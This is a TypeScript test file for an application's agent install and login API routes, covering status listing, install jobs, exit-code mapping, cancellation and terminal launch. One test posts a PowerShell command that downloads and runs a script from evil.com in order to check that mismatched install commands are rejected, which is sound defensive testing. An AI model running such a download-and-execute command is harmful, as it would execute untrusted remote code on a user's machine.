// Tests for agent discovery, install, and login routes (WP-3.03a, WP-3.06b, R-AG-10, R-AG-21, S-54).
import { AgentStatusSchema } from '@kumicraft/shared';
import { afterEach, describe, expect, it } from 'vitest';
import { z } from 'zod';

import {
  AGY_INSTALL_CMD,
  type AppContext,
  buildTestApp,
  HEADERS,
  waitForJobEnd,
} from './agents-test-support.ts';

const JobIdResponseSchema = z.strictObject({
  data: z.strictObject({ jobId: z.string() }),
});

describe('Agent routes [WP-3.03a, WP-3.06b, R-AG-10, R-AG-21]', () => {
  let ctx: AppContext | undefined;

  afterEach(async () => {
    if (ctx !== undefined) {
      await ctx.app.close();
      ctx = undefined;
    }
  });

  it('[R-AG-21] 12. GET /agents returns status array with installCommand, docsUrl, loginAvailable, and login', async () => {
    ctx = await buildTestApp({
      statuses: () =>
        Promise.resolve([
          {
            id: 'agy',
            installed: true,
            version: '1.4.3',
            login: 'loggedIn',
            installCommand: AGY_INSTALL_CMD,
            docsUrl: 'https://docs.agy.ai',
            loginAvailable: true,
          },
          {
            id: 'claude',
            installed: false,
            login: 'unknown',
            installCommand: ['powershell', '-Command', 'irm https://claude.ai/install.ps1 | iex'],
            docsUrl: 'https://docs.anthropic.com/claude-code',
            loginAvailable: false,
          },
        ]),
    });

    const res = await ctx.app.inject({ method: 'GET', url: '/api/v1/agents', headers: HEADERS });
    expect(res.statusCode).toBe(200);
    const parsed = z.object({ data: z.array(AgentStatusSchema) }).parse(res.json());
    expect(parsed.data[0]?.installCommand).toEqual(AGY_INSTALL_CMD);
    expect(parsed.data[0]?.docsUrl).toBe('https://docs.agy.ai');
    expect(parsed.data[0]?.loginAvailable).toBe(true);
    expect(parsed.data[0]?.login).toBe('loggedIn');
    expect(parsed.data[1]?.loginAvailable).toBe(false);
  });

  it('[R-AG-21, S-54] 13. POST /agents/agy/install with command mismatch returns 400 E016 commandMismatch', async () => {
    ctx = await buildTestApp({});
    const res = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/install',
      headers: HEADERS,
      payload: { command: ['powershell', '-Command', 'irm https://evil.com/install.ps1 | iex'] },
    });
    expect(res.statusCode).toBe(400);
    expect(res.json()).toMatchObject({
      error: { code: 'E016', params: { reason: 'commandMismatch' } },
    });
    expect(ctx.spawned).toHaveLength(0);
  });

  it('[R-AG-21] 14. POST /agents/agy/install success returns 202 jobId, captures lines, and triggers statuses refresh', async () => {
    let refreshCalled = false;
    ctx = await buildTestApp({
      behavior: { exitCode: 0, lines: ['Downloading...', 'Installed successfully!'] },
      statuses: () => {
        refreshCalled = true;
        return Promise.resolve([]);
      },
    });

    const res = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/install',
      headers: HEADERS,
      payload: { command: AGY_INSTALL_CMD },
    });
    expect(res.statusCode).toBe(202);
    const parsed = JobIdResponseSchema.parse(res.json());
    const jobId = parsed.data.jobId;
    await waitForJobEnd(ctx.jobs, ctx.eventBus, jobId);
    const jobStatus = ctx.jobs.get(jobId);
    expect(jobStatus.ok).toBe(true);
    if (jobStatus.ok) {
      expect(jobStatus.value.state).toBe('completed');
      expect(jobStatus.value.lines).toEqual(['Downloading...', 'Installed successfully!']);
    }
    expect(refreshCalled).toBe(true);
  });

  it('[R-AG-21] 15. POST /agents/agy/install maps failure codes 1 (E028), 124 (E020 timeout), and 127 (E021 installer)', async () => {
    const testCases = [
      { exitCode: 1, expectedCode: 'E028' },
      { exitCode: 124, expectedCode: 'E020' },
      { exitCode: 127, expectedCode: 'E021' },
    ];
    for (const tc of testCases) {
      const localCtx = await buildTestApp({
        behavior: { exitCode: tc.exitCode, lines: ['Fatal installation failure'] },
      });
      const res = await localCtx.app.inject({
        method: 'POST',
        url: '/api/v1/agents/agy/install',
        headers: HEADERS,
        payload: { command: AGY_INSTALL_CMD },
      });
      expect(res.statusCode).toBe(202);
      const parsed = JobIdResponseSchema.parse(res.json());
      const jobId = parsed.data.jobId;
      await waitForJobEnd(localCtx.jobs, localCtx.eventBus, jobId);
      const jobStatus = localCtx.jobs.get(jobId);
      expect(jobStatus.ok).toBe(true);
      if (jobStatus.ok) {
        expect(jobStatus.value.state).toBe('failed');
        expect(jobStatus.value.error?.code).toBe(tc.expectedCode);
      }
      await localCtx.app.close();
    }
  });

  it('[R-AG-21] 16. cancelling running install kills process and sets job cancelled, while concurrent install gives 409 E018', async () => {
    ctx = await buildTestApp({ behavior: { hang: true } });
    const res1 = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/install',
      headers: HEADERS,
      payload: { command: AGY_INSTALL_CMD },
    });
    expect(res1.statusCode).toBe(202);
    const parsed1 = JobIdResponseSchema.parse(res1.json());
    const jobId1 = parsed1.data.jobId;

    const res2 = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/install',
      headers: HEADERS,
      payload: { command: AGY_INSTALL_CMD },
    });
    expect(res2.statusCode).toBe(409);
    expect(res2.json()).toMatchObject({ error: { code: 'E018' } });

    const cancelRes = await ctx.app.inject({
      method: 'POST',
      url: `/api/v1/jobs/${jobId1}/cancel`,
      headers: HEADERS,
    });
    expect(cancelRes.statusCode).toBe(202);
    await waitForJobEnd(ctx.jobs, ctx.eventBus, jobId1);
    const jobStatus = ctx.jobs.get(jobId1);
    expect(jobStatus.ok).toBe(true);
    if (jobStatus.ok) {
      expect(jobStatus.value.state).toBe('cancelled');
    }
    expect(ctx.spawned[0]?.killed).toBe(true);
  });

  it('[R-AG-21] 17. POST /agents/agy/login opens terminal without agent args, or returns E021 when agent/terminal missing', async () => {
    const fallbackPath = 'C:\\Users\\Test\\AppData\\Local\\agy\\bin\\agy.exe';
    ctx = await buildTestApp({
      commandOf: () => Promise.resolve({ command: fallbackPath, prefixArgs: [] }),
      terminal: (cmd) => ['cmd.exe', '/c', 'start', '', cmd],
      behavior: { exitCode: 0 },
    });
    const res1 = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/login',
      headers: HEADERS,
    });
    expect(res1.statusCode).toBe(204);
    expect(ctx.spawned[0]?.cmd).toBe('cmd.exe');
    expect(ctx.spawned[0]?.args).toEqual(['/c', 'start', '', fallbackPath]);
    await ctx.app.close();

    ctx = await buildTestApp({ commandOf: () => Promise.resolve(undefined) });
    const res2 = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/login',
      headers: HEADERS,
    });
    expect(res2.statusCode).toBe(409);
    expect(res2.json()).toMatchObject({ error: { code: 'E021', params: { missing: 'agent' } } });
    await ctx.app.close();

    ctx = await buildTestApp({
      commandOf: () => Promise.resolve({ command: fallbackPath, prefixArgs: [] }),
      terminal: () => undefined,
    });
    const res3 = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/login',
      headers: HEADERS,
    });
    expect(res3.statusCode).toBe(409);
    expect(res3.json()).toMatchObject({
      error: { code: 'E021', params: { missing: 'terminal' } },
    });
    await ctx.app.close();

    ctx = await buildTestApp({
      commandOf: () => Promise.resolve({ command: fallbackPath, prefixArgs: [] }),
      behavior: { exitCode: 127 },
    });
    const res4 = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/login',
      headers: HEADERS,
    });
    expect(res4.statusCode).toBe(409);
    expect(res4.json()).toMatchObject({
      error: { code: 'E021', params: { missing: 'terminal' } },
    });
  });

  it('[R-AG-21] 18. POST /agents/agy/login succeeds with 204 when terminal process is still running after wait window without killing it', async () => {
    ctx = await buildTestApp({
      commandOf: () => Promise.resolve({ command: 'agy', prefixArgs: [] }),
      behavior: { hang: true },
      loginWaitMs: 30,
    });
    const res = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/agy/login',
      headers: HEADERS,
    });
    expect(res.statusCode).toBe(204);
    expect(ctx.spawned[0]?.killed).toBe(false);
  });

  it('[R-AG-21] 19. rejects install and login for unknown agent id with 400 E016', async () => {
    ctx = await buildTestApp({});
    const installRes = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/xyz/install',
      headers: HEADERS,
      payload: { command: ['echo', 'hi'] },
    });
    expect(installRes.statusCode).toBe(400);
    expect(installRes.json()).toMatchObject({ error: { code: 'E016' } });

    const loginRes = await ctx.app.inject({
      method: 'POST',
      url: '/api/v1/agents/xyz/login',
      headers: HEADERS,
    });
    expect(loginRes.statusCode).toBe(400);
    expect(loginRes.json()).toMatchObject({ error: { code: 'E016' } });
  });
});
